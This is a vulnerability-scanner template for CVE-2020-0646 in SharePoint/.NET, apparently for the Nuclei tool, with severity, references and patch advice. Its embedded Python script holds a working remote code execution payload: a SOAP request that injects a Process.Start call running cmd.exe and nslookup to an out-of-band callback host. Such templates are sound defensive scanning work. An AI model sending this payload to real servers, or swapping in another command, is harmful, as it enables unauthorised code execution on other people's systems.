templates/CVE-2020-0646.yaml

code:
- engine:
  - py
  - python3
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(body, "ValidateWorkflowMarkupAndCreateSupportObjectsResponse")
    - contains(content_type, "text/xml")
    - status_code == 200
    type: dsl
  source: "import os\nimport urllib3\nimport requests\nurllib3.disable_warnings()\n\
    default_ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36\
    \ (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'\npaths = [os.getenv('Path'),\
    \ '/_vti_bin/webpartpages.asmx']\nhost = os.getenv('RootURL')\ndomain = os.getenv('OAST')\n\
    user = os.getenv('username')\npswd = os.getenv('password')\ndata = f'''<?xml version=\"\
    1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n<soap:Body>\n    <ValidateWorkflowMarkupAndCreateSupportObjects xmlns=\"http://microsoft.com/sharepoint/webpartpages\"\
    >\n    <workflowMarkupText>\n        <![CDATA[\n        <SequentialWorkflowActivity\
    \ x:Class=\"MyWorkflow\" x:Name=\"foobar\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\
    \ xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/workflow\">\n         \
    \   <CallExternalMethodActivity x:Name=\"foo\" MethodName='test1' InterfaceType='System.String);}}Object/**/test2=System.Diagnostics.Process.Start(\"\
    cmd.exe\", \"/c nslookup {domain}\");private/**/void/**/foobar(){{//' />\n   \
    \     </SequentialWorkflowActivity>\n        ]]>\n    </workflowMarkupText>\n\
    \    <rulesText></rulesText>\n    <configBlob></configBlob>\n    <flag>2</flag>\n\
    \    </ValidateWorkflowMarkupAndCreateSupportObjects>\n</soap:Body>\n</soap:Envelope>\n\
    '''\ndef main():\n    if (user != None) and (pswd != None):\n        ntlm = True\n\
    \    else:\n        ntlm = False\n    if host is None:\n        print(\"missing\
    \ target. You must specify -u <url>\")\n        exit(1)\n    if ntlm:\n      \
    \  from requests_ntlm import HttpNtlmAuth\n        _auth = HttpNtlmAuth(user,\
    \ pswd)\n    else:\n        _auth = None\n    _headers = {\n        'User-Agent':\
    \ default_ua,\n        'Content-Type': 'text/xml'\n    }\n    for item in paths:\n\
    \        url = os.getenv('RootURL') + item\n        res = requests.post(url, data,\
    \ auth=_auth, verify=None, headers=_headers)\n        if res.status_code != 200:\n\
    \            continue\n        else:\n            print(f\"HTTP/1.1 {res.status_code}\
    \ {res.reason}\")\n            for key, value in res.headers.items():\n      \
    \          print(f\"{key}: {value}\")\n            print(f\"\\n{res.text}\")\n\
    \            break\nif __name__ == '__main__':\n    main()\n"
id: CVE-2020-0646
info:
  author: pszyszkowski
  classification:
    cpe: cpe:2.3:a:microsoft:.net_framework:3.0:sp2:*:*:*:*:*:*
    cve-id: CVE-2020-0646
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-91
    epss-percentile: 0.99859
    epss-score: 0.93865
  description: 'A remote code execution vulnerability exists when the Microsoft .NET
    Framework fails to validate input properly, aka ''.NET Framework Remote Code Execution
    Injection Vulnerability''.

    '
  impact: 'Attackers can execute arbitrary code remotely, potentially leading to full
    system compromise.

    '
  metadata:
    max-request: 1
    product: .net_framework
    shodan-query: server:"ms .net remoting"
    vendor: microsoft
    verified: true
  name: Microsoft .NET Framework - Remote Code Execution
  reference:
  - https://www.cve.org/CVERecord?id=CVE-2020-0646
  - https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0646
  - http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html
  remediation: 'Apply Microsoft security patches as described in the February 2020
    SharePoint security update.

    '
  severity: critical
  tags: cve,cve2020,net-framework,sharepoint,microsoft,packetstorm,rce,kev,oast,vkev,vuln
variables:
  OAST: '{{interactsh-url}}'
